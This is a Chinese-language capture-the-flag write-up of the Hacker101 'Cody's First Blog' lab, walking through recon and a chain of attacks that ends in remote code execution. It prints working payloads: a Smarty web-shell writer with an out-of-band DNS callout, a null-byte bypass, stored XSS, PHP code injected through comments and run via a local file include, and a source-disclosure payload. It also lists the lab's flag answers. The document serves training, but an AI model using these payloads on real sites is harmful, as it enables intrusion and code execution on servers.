## 侦察

- 访问首页
    ```http
    GET / HTTP/1.1
    Host: id.ctf.hacker101.com
    ```
    - 响应

        ```http
        Server: openresty/1.31.1.1
        X-Powered-By: PHP/5.5.9-1ubuntu4.24
        Vary: Accept-Encoding
        ```
        - 揭示后端组件
        - 揭示缓存键，或其他用途

        ```md
        Home -- Cody's First Blog

        欢迎来到我的博客！我很高兴能与世界分享我的想法。我有很多重要且具有争议性的观点，希望在此传达。

        2018年9月1日 —— 第一篇

        第一篇帖子！我构建这个博客引擎是围绕一个基本理念：PHP 不需要模板语言，因为它本身就是一种模板语言。这台服务器无法与外界通信，除了我之外没有人能上传文件，所以使用 `include()` 没有任何风险。

        请稍作停留，随意评论；欢迎所有想法！
        ```
        - 再次揭示后端语言 PHP
            - 使用 `include()` 包含内容

        ```html
        <h3>
            Comments
        </h3>
        <!--<a href="?page=admin.auth.inc">Admin login</a>-->
        <h4>
            Add comment:
        </h4>
        <form method="POST">
            <textarea rows="4" cols="60" name="body">
        </textarea>
            <br>
            <input type="submit" value="Submit">
        </form>
        ```
        - 注释揭示管理端点
        - 拥有评论功能

- 使用评论功能

    ```http
    POST / HTTP/2
    Host: id.ctf.hacker101.com
    Accept-Encoding: gzip, deflate, br

    body=comment+test
    ```

    - 响应
        ```html
        <p>
        Comment submitted and awaiting approval!
        </p>
        <a href="javascript:window.history.back()">
        Go back
        </a>
        ```

- 访问管理端点
    ```http
    GET /?page=admin.auth.inc HTTP/2
    Host: id.ctf.hacker101.com
    ```
    - 响应
        ```html
        <h1>
            Admin Login
        </h1>
        <form method="POST">
            Username: <input type="text" name="username">
            <br>
            Password: <input type="password" name="password">
            <br>
            <input type="submit" value="Log In">
        ```
        - 登录表单
        - 页面仍存在端点注释与评论提交功能

- 使用管理端点的登录功能
    ```http
    POST /?page=admin.auth.inc HTTP/2
    Host: id.ctf.hacker101.com
    Accept-Encoding: gzip, deflate, br

    username=wiener&password=peter
    ```
    - 响应

        ```html
        <span style="color: red;">
            Incorrect username or password
        </span>
        ```
        - 相同页面，额外添加错误提示
            - 似乎使用通用错误信息，不揭示有效用户名
## 探测

### 根目录提交文章的参数暴破

- 设置
    ```http
    POST / HTTP/2

    body=§§
    ```
    - 特异载荷
        ```
        {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['nslookup id.oastify.com']); ?>",self::clearConfig())}
        ```

    - 响应
        ```html
        <p>
            ^FLAG^dcd3f81275bb23188ceaa7c7619d5ed8da76ca4ad04336944181b34aff408dcf$FLAG$
        </p>
        <p>
            Comment submitted and awaiting approval!
        </p>
        <a href="javascript:window.history.back()">
            Go back
        </a>
        ```
        - flag 0 点数 5
        - 并未得到 DNS 请求
    
    - 继续探索触发 flag 响应的载荷，缩小有效载荷
        ```php
        <?php ?>
        ```
    - > 之后回推：作为 flag2 的前置步骤，设置 php 载荷

### `/?page=§§` 参数

- 空参数
    ```http
    GET /?page= HTTP/2
    Host: id.ctf.hacker101.com
    ```
    - 响应
        ```html
        <head>
            <title>
                <!-- 
                    之前 `Home`，对应 title 变量 
                -->
                <br />
                <b>
                    Notice
                </b>
                : Undefined variable: title in <b>
                    /app/index.php
                </b>
                on line <b>
                    27
                </b>
                <br />
                -- Cody's First Blog
            </title>
        </head>

        <body>
            <!-- 
                之前 `<h1>Home</h1>`，对应 title 变量 
            -->
            <h1>
                <br />
                <b>
                    Notice
                </b>
                : Undefined variable: title in <b>
                    /app/index.php
                </b>
                on line <b>
                    30
                </b>
                <br />
            </h1>
            <!-- 之前 h1 后的描述 -->
            <br />
            <b>
                Warning
            </b>
            : include(.php): failed to open stream: No such file or directory in <b>
                /app/index.php
            </b>
            on line <b>
                21
            </b>
            <br />
            <br />
            <!-- 之前文章的标题与内容 -->
            <b>
                Warning
            </b>
            : include(): Failed opening '.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in <b>
                /app/index.php
            </b>
            on line <b>
                21
            </b>
        ```
        - 使用 burp 对比器，快速查看差异
            - 确认主页描述中的模板式结构，以及方法 `include()`
            - 当前页面路径暴露 `/app/index.php`

- 任意参数 
    `/?page=foooooooooooo` 
    - 响应差异
        ```log
        <b>Warning</b>:  include(foooooooooooo.php): failed to open stream: No such file or directory in <b>/app/index.php</b> on line <b>21</b><br />
        <br />
        <b>Warning</b>:  include(): Failed opening 'foooooooooooo.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in <b>/app/index.php</b> on line <b>21</b><br />
        ```
        - 之前空载荷时 
            ```log
            include(.php)
            : include(): Failed opening '.php'
            ```
        - 此处为当前载荷字符串
    
    - > 确认 php 文件包含漏洞，被添加 `.php` 后缀
    - XSS 测试
        - 无，被 HTML 编码

- 模糊测试
    - 协作服务器收到 DNS 请求
        `/?page=http://id.oastify.com/`

        - 响应 504 超时，无 HTTP 连接
        - 修改协议为 `https` 后，无 DNS 连接，返回 200 主页

- 测试 `.php` 后缀移除
    - 添加 `%00` 空字节
        `/?page=000-default.conf%00`
        - 响应
            ```log
            :  include(): Failed opening '000-default.conf' for inclusion (include_path='.:/usr/share/php:/usr/share/pear')
            ```
        - 成功移除后缀，但仍不可用

- 尝试读取 `index.php`
    `/?page=index`
    - 响应
        ```html
        <br />
        <b>
            Fatal error
        </b>
        : Allowed memory size of 134217728 bytes exhausted (tried to allocate 16384 bytes) in <b>
            /app/index.php
        </b>
        on line <b>
            20
        </b>
        <br />
        ```
    - 分配巨大内存导致异常
        - > 之后回推：无限自我包含

### 根目录暴破

- > 得到一批文件数据，归纳到 [文件](#文件)
- 一批 403 Forbidden
- `/posts` 301 重定向到 `/posts/`
    ```http
    GET /posts/ HTTP/2
    Host: id.ctf.hacker101.com
    ```
    - 响应为 `/posts` 的目录索引
        ```html
        <head>
            <title>Index of /posts</title>
        </head>

        <body>
            <h1>Index of /posts</h1>
            <table>
                <tr>
                    <th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th>
                    <th><a href="?C=N;O=D">Name</a></th>
                    <th><a href="?C=M;O=A">Last modified</a></th>
                    <th><a href="?C=S;O=A">Size</a></th>
                    <th><a href="?C=D;O=A">Description</a></th>
                </tr>
                <tr>
                    <th colspan="5">
                        <hr>
                    </th>
                </tr>
                <tr>
                    <td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td>
                    <td><a href="/">Parent Directory</a></td>
                    <td>&nbsp;</td>
                    <td align="right"> - </td>
                    <td>&nbsp;</td>
                </tr>
                <tr>
                    <td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td>
                    <td><a href="first.inc.php">first.inc.php</a></td>
                    <td align="right">2018-12-12 07:41 </td>
                    <td align="right">414 </td>
                    <td>&nbsp;</td>
                </tr>
                <tr>
                    <th colspan="5">
                        <hr>
                    </th>
                </tr>
            </table>
        ```
        - 文件名 `first.inc.php` 揭示使用点分隔的文件命名风格
        - 下载3个 gif 图片，查看元数据
            - 元数据无异常
            - 似乎不存在[隐写内容](https://stegotoolkit.com/steganography/stegsolve)
        - 排序端点 `/posts/?C=N;O=D` 可能有趣

- 访问登录表单
    ```http
    GET /admin.auth.inc.php HTTP/2
    ```
    - 得到 `/?page=admin.auth.inc` 的表单内容

- 文件名风格分析
    ```log
    first.inc.php
    admin.auth.inc.php
    ```
    - 使用 `.` 逐层分隔
    - 后缀包含 `.inc`
    - 无法包含任意文件，仅限开发者构造的用来被包含的文件

- 访问 `/admin.inc.php`，得到特异响应
    ```html
    <h2>
        Pending Comments
    </h2>
    <br />
    <b>
        Warning
    </b>
    : mysql_query(): Access denied for user ''@'localhost' (using password: NO) in <b>
        /app/admin.inc.php
    </b>
    on line <b>
        5
    </b>
    <br />
    <br />
    <b>
        Warning
    </b>
    : mysql_query(): A link to the server could not be established in <b>
        /app/admin.inc.php
    </b>
    on line <b>
        5
    </b>
    <br />
    <br />
    <b>
        Warning
    </b>
    : mysql_fetch_assoc() expects parameter 1 to be resource, boolean given in <b>
        /app/admin.inc.php
    </b>
    on line <b>
        6
    </b>
    <br />
    ```
    - 仍为 php 模板，缺乏权限

- 使用 page 文件包含端点根据命名风格仅限探测 `/?page=admin.inc`，得到管理员面板
    ```html
    <hr>
    <h3>Comment on home.inc</h3>
    <p>test</p>
    <a href="?page=admin.inc&approve=3">Approve Comment</a>

    <hr>
    <h3>Comment on home.inc</h3>
    <p>&lt;?php ?&gt;</p>
    <a href="?page=admin.inc&approve=188">Approve Comment</a>

    <hr>
    <p>Admin flag is ^FLAG^d457cebaa7fd5bfd2f6fb9271e5cf85a3d2d85f0dda05da3e6b329779db3c9b1$FLAG$</p>
    ```
    - 各页面拥有独立的评论功能
        - `home.inc`
        - `admin.inc`

- 使用批准功能
    ```http
    GET /?page=admin.inc&approve=188 HTTP/2
    ```
    - 批准 `test` 与 `<?php ?>`

    - 查看首页
        ```html
        <p>test</p>
        <p><?php ?></p>
        ```

- 重启挑战，提交 XSS 载荷
    ```html
    <img src onerror=print()>
    ```
    - 批准后访问对应页面将执行 JS 代码

- > 根据之前已知的文件包含的 URL 格式，尝试访问 `index.php`
    ```http
    GET /?page=http://localhost/index HTTP/2
    ```
    - 响应
        ```html
        <!doctype html>
        <html>

        <head>
            <title>
                <br />
                <b>
                    Notice
                </b>
                : Undefined variable: title in <b>
                    /app/index.php
                </b>
                on line <b>
                    27
                </b>
                <br />
                -- Cody's First Blog
            </title>
        </head>

        <body>
            <h1>
                <br />
                <b>
                    Notice
                </b>
                : Undefined variable: title in <b>
                    /app/index.php
                </b>
                on line <b>
                    30
                </b>
                <br />
            </h1>
            <!doctype html>
            <html>

            <head>
                <title>
                    Home -- Cody's First Blog
                </title>
            </head>

            <body>
                <h1>
                    Home
                </h1>
                <p>
                    Welcome to my blog! I'm excited to share my thoughts with the world. I have many important and controversial positions, which I hope to get across here.
                </p>

                <h2>
                    September 1, 2018 -- First
                </h2>
                <p>
                    First post! I built this blog engine around one basic concept: PHP doesn't need a template language because it <i>
                        is
                    </i>
                    a template language. This server can't talk to the outside world and nobody but me can upload files, so there's no risk in just using include().
                </p>
                <p>
                    Stick around for a while and comment as much as you want; all thoughts are welcome!
                </p>


                <br>
                <br>
                <hr>
                <h3>
                    Comments
                </h3>
                <!--<a href="?page=admin.auth.inc">Admin login</a>-->
                <h4>
                    Add comment:
                </h4>
                <form method="POST">
                    <textarea rows="4" cols="60" name="body">
                </textarea>
                    <br>
                    <input type="submit" value="Submit">
                </form>
                <hr>
                <p>
                    <img src onerror=print()>
                </p>
            </body>

            </html>
            <br>
            <br>
            <hr>
            <h3>
                Comments
            </h3>
            <!--<a href="?page=admin.auth.inc">Admin login</a>-->
            <h4>
                Add comment:
            </h4>
            <form method="POST">
                <textarea rows="4" cols="60" name="body">
            </textarea>
                <br>
                <input type="submit" value="Submit">
            </form>
        </body>

        </html>
        ```
        - 输入作为 index.php 的一部分
        - 若单纯访问首页，提交的输入被完全反射可执行 XSS，但攻击者 php 载荷仅作为字符串并不会执行
        - 此时 include index.php 时，渲染为 HTML 后的攻击者 php 载荷被加载并执行（而非加载原文件本身导致的开发者代码无限自我包含）

- 提交测试载荷
    ```php
    <?php echo "echo test" ?>
    ```
    ```http
    POST / HTTP/1.1

    body=%3C%3Fphp+echo+%22echo+test%22+%3F%3E
    ```
    - 文件包含的管理端点批准
        ```http
        GET /?page=admin.inc&approve=4 HTTP/2
        ```
    - 此时首页内容
        ```html
        <p>
            <?php echo "echo test" ?>
        </p>
        ```
    - 文件包含的 URL 首页加载
        ```http
        GET /?page=http://localhost/index HTTP/2
        ```
        - 响应
            ```html
            <p>
                echo test
            </p>
            ```
    - 文件包含端点加载 php 代码后成功执行，此时可使用文件上传主题的载荷

- 设置 php 载荷，查看 `index.php`
    ```php
    <?php echo file_get_contents('index.php'); ?>
    ```
    - 响应，提取 php 文件内容

        ```php
        <?php
        // ^FLAG^61e720baa79eead4d5d111b78ece727f62da2185b1a39bcb5e567e89dc313a56$FLAG$
        mysql_connect("localhost", "root", "");
        mysql_select_db("level4");
        $page = isset($_GET['page']) ? $_GET['page'] : 'home.inc';
        if (strpos($page, ':') !== false && substr($page, 0, 5) !== "http:") $page = "home.inc";

        if (isset($_POST['body']))
        {
            mysql_query("INSERT INTO comments (page, body, approved) VALUES ('" . mysql_real_escape_string($page) . "', '" . mysql_real_escape_string($_POST['body']) . "', 0)");
            // 请求体包含字符串 '<?php' 即返回 flag0
            if (strpos($_POST['body'], '<?php') !== false) echo '<p>^FLAG^dcd3f81275bb23188ceaa7c7619d5ed8da76ca4ad04336944181b34aff408dcf$FLAG$</p>';
        ?>
            <p>Comment submitted and awaiting approval!</p>
            <a href="javascript:window.history.back()">Go back</a>
        <?php
            exit();
        }

        ob_start();
        // 文件包含端点包含本文件时导致自我包含异常的根源
        include ($page . ".php");
        $body = ob_get_clean();
        ?>
        <!doctype html>
        <html>
            <head>
                <title><?php echo $title; ?> -- Cody's First Blog</title>
            </head>
            <body>
                <h1><?php echo $title; ?></h1>
                <?php echo $body; ?>
                <br>
                <br>
                <hr>
                <h3>Comments</h3>
                <!--<a href="?page=admin.auth.inc">Admin login</a>-->
                <h4>Add comment:</h4>
                <form method="POST">
                    <textarea rows="4" cols="60" name="body"></textarea><br>
                    <input type="submit" value="Submit">
                </form>
        <?php
        $q = mysql_query("SELECT body FROM comments WHERE page='" . mysql_real_escape_string($page) . "' AND approved=1");
        while ($row = mysql_fetch_assoc($q))
        {
        ?>
                <hr>
                <p><?php echo $row["body"]; ?></p>
                <?php
        }
        ?>
            </body>
        </html>
        ```


## 文件

- `/Dockerfile`

    ```dockerfile
    FROM nimmis/apache-php5

    COPY 000-default.conf /etc/apache2/sites-available/000-default.conf
    COPY php.ini /etc/php5/apache2/php.ini

    EXPOSE 80

    WORKDIR /app

    RUN apt-get update
    RUN DEBIAN_FRONTEND=noninteractive apt-get install -y mysql-client mysql-server libmysqlclient-dev build-essential python-dev python-pip
    RUN pip install mysqlclient

    ADD . /app

    CMD bash setup.sh
    ```
    - 当前工作目录 `/app`
    - 后端为 python + mysql

    - 直接列出的文件名
        ```log
        000-default.conf
        php.ini
        setup.sh
        ```

- `/index.php`
    主页

- `/php.ini`
    配置文件

- `/setup.sh`

    ```sh
    #!/bin/bash
    set -e

    chgrp -R mysql /var/lib/mysql
    service mysql start &
    python setup.py
    rm setup.py
    export FLAGS='[]'

    /usr/sbin/apache2ctl -D FOREGROUND
    ```

- `/000-default.conf`

    ```conf
    <VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /app
        
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        
        <Directory /app>
            Options Indexes FollowSymLinks
            AllowOverride All
            Require all granted
        </Directory>
    </VirtualHost>
    ```
    - 应用程序根目录 `/app`

## 端点

`/`
- GET 获取表单
- POST 提交评论

`/?page=admin.auth.inc`
- 注释中的管理员端点

`/posts/`
- 发布文章目录
- 排序端点 
    `/posts/?C=N;O=D`

`/icons/unknown.gif`
- 图标

## 待测试

缓存键 `Vary: Accept-Encoding`
- 缓存
- 或作为验证

管理端点 `?page=admin.auth.inc`
- 登录表单有效用户名
- SQL 注入

`/?page=§§` 参数，后端代码 `PHP include()`
- 文件名
- 以点分割的路径
- > [!tip] php 文件包含

`/` 根目录暴破
- > [!tip] 配置文件

## hint

Flag0
- 你看到的第一个输入是什么？
- 弄清楚这个平台运行的是什么，可能会给你一些思路。
- 代码注入通常不会生效。

Flag1
- 确保你检查了所有提供给你的内容。
- 未使用的代码往往会泄露你原本无法获得的信息。
- 简单猜测可能对你有帮助。

Flag2
- 仔细阅读第一篇博客文章。
- 我们在 Hacker101 的文件包含漏洞视频中讨论过这一点。
- 你可以在哪里访问自己存储的数据？
- `include` 不仅适用于文件名。